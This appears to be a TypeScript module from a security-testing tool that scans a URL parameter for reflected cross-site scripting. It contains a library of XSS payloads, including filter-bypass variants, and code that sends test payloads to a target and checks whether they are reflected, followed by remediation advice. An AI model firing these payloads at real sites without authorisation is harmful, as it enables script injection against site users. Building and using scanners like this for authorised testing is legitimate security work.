import { performance } from 'node:perf_hooks';
import { logToolActivity } from '../utils/activityLogger.js';

export interface XSSResult {
  url: string;
  parameter: string;
  vulnerable: boolean;
  xssType?: 'reflected';
  payloadUsed?: string;
  context?: string;
  recommendations: string[];
  payloadLibrary: PayloadCategory[];
  scanDuration: number;
}

export interface PayloadCategory {
  context: string;
  payloads: Array<{ payload: string; description: string }>;
}

const PAYLOAD_LIBRARY: PayloadCategory[] = [
  {
    context: 'HTML',
    payloads: [
      { payload: '<script>alert(1)</script>', description: 'Basic script tag injection' },
      { payload: '<img src=x onerror=alert(1)>', description: 'Image error event handler' },
      { payload: '<svg onload=alert(1)>', description: 'SVG onload event' },
      { payload: '<body onload=alert(1)>', description: 'Body onload event' },
      { payload: '<details open ontoggle=alert(1)>', description: 'Details toggle event' },
      { payload: '<video src=x onerror=alert(1)>', description: 'Video error event' },
      { payload: '<audio src=x onerror=alert(1)>', description: 'Audio error event' },
      { payload: '<iframe srcdoc="<script>alert(1)</script>"></iframe>', description: 'Iframe srcdoc' },
      { payload: '<math><mtext><table><mglyph><style><!--</style><img title="--><img src=x onerror=alert(1)>">', description: 'Math tag bypass' },
    ],
  },
  {
    context: 'Attribute',
    payloads: [
      { payload: '"><script>alert(1)</script>', description: 'Break out of attribute' },
      { payload: "'><script>alert(1)</script>", description: 'Single quote break out' },
      { payload: '" onmouseover="alert(1)"', description: 'Event handler injection' },
      { payload: "' onmouseover='alert(1)'", description: 'Event handler injection (single)' },
      { payload: '"><img src=x onerror=alert(1)>', description: 'Image injection via attribute' },
      { payload: '" autofocus onfocus="alert(1)"', description: 'Autofocus onfocus' },
      { payload: "' autofocus onfocus='alert(1)'", description: 'Autofocus onfocus (single)' },
    ],
  },
  {
    context: 'JavaScript',
    payloads: [
      { payload: '"-alert(1)-"', description: 'String concatenation break' },
      { payload: "'-alert(1)-'", description: 'Single quote string break' },
      { payload: ';alert(1)//', description: 'Statement injection' },
      { payload: '`;alert(1)//`', description: 'Template literal break' },
      { payload: '\');alert(1)//', description: 'Closing paren and break' },
      { payload: '</script><script>alert(1)</script>', description: 'Script tag close and reopen' },
    ],
  },
  {
    context: 'URL',
    payloads: [
      { payload: 'javascript:alert(1)', description: 'JavaScript URL scheme' },
      { payload: 'javascript:alert%281%29', description: 'URL encoded JavaScript scheme' },
      { payload: 'JAVASCRIPT:alert(1)', description: 'Uppercase scheme bypass' },
      { payload: 'jaVaScRiPt:alert(1)', description: 'Mixed case scheme bypass' },
      { payload: 'data:text/html,<script>alert(1)</script>', description: 'Data URI HTML' },
    ],
  },
  {
    context: 'Filter Bypass',
    payloads: [
      { payload: '<ScRiPt>alert(1)</sCrIpT>', description: 'Case mutation bypass' },
      { payload: '<script>alert`1`</script>', description: 'Backtick bypass' },
      { payload: '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>', description: 'charCode bypass' },
      { payload: '<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;49&#41;">', description: 'HTML entity bypass' },
      { payload: '<svg><script>alert(1)</script></svg>', description: 'SVG wrapper bypass' },
      { payload: '<scr<script>ipt>alert(1)</scr</script>ipt>', description: 'Nested tag bypass' },
      { payload: '<<script>alert("XSS");//<</script>', description: 'Double open bracket' },
    ],
  },
];

const TEST_PAYLOADS = [
  '<script>alert(1)</script>',
  '"><script>alert(1)</script>',
  "'><img src=x onerror=alert(1)>",
  '<svg onload=alert(1)>',
];

async function testXSSPayload(
  url: string,
  parameter: string,
  payload: string,
  method: 'GET' | 'POST',
  timeoutMs: number
): Promise<{ reflected: boolean; responseTime: number }> {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);
  const start = performance.now();

  try {
    let response;
    if (method === 'GET') {
      const u = new URL(url);
      u.searchParams.set(parameter, payload);
      response = await fetch(u.toString(), { signal: controller.signal, redirect: 'follow' });
    } else {
      response = await fetch(url, {
        method: 'POST',
        signal: controller.signal,
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `${encodeURIComponent(parameter)}=${encodeURIComponent(payload)}`,
      });
    }
    clearTimeout(timer);

    const body = await response.text();
    const responseTime = Math.round(performance.now() - start);

    // Check if payload appears unencoded in response
    const isReflected =
      body.includes(payload) ||
      body.includes('<script>alert(1)</script>') ||
      (body.includes('<script>') && body.includes('alert(1)'));

    return { reflected: isReflected, responseTime };
  } catch {
    clearTimeout(timer);
    return { reflected: false, responseTime: Math.round(performance.now() - start) };
  }
}

export async function performXSSTest(
  url: string,
  parameter: string,
  context: string = 'html',
  timeoutMs: number = 10000
): Promise<XSSResult> {
  const start = performance.now();
  logToolActivity('XSS Payload Generator', `Testing ${url} param: ${parameter}`, 'info');

  const recommendations = [
    'Encode all output context-appropriately (HTML, JS, URL, CSS encoding).',
    'Use a Content-Security-Policy header with nonces or hashes.',
    'Validate and sanitize all user inputs server-side.',
    'Use modern frameworks with automatic escaping (React, Angular, Vue).',
    'Set HttpOnly and Secure flags on cookies.',
  ];

  for (const payload of TEST_PAYLOADS) {
    const result = await testXSSPayload(url, parameter, payload, 'GET', timeoutMs);
    if (result.reflected) {
      logToolActivity('XSS Payload Generator', `XSS reflection detected at ${url}`, 'success');
      return {
        url, parameter, vulnerable: true,
        xssType: 'reflected',
        payloadUsed: payload,
        context,
        recommendations,
        payloadLibrary: PAYLOAD_LIBRARY,
        scanDuration: Math.round((performance.now() - start) / 1000),
      };
    }
  }

  logToolActivity('XSS Payload Generator', `No XSS reflection detected at ${url}`, 'success');
  return {
    url, parameter, vulnerable: false,
    recommendations,
    payloadLibrary: PAYLOAD_LIBRARY,
    scanDuration: Math.round((performance.now() - start) / 1000),
  };
}
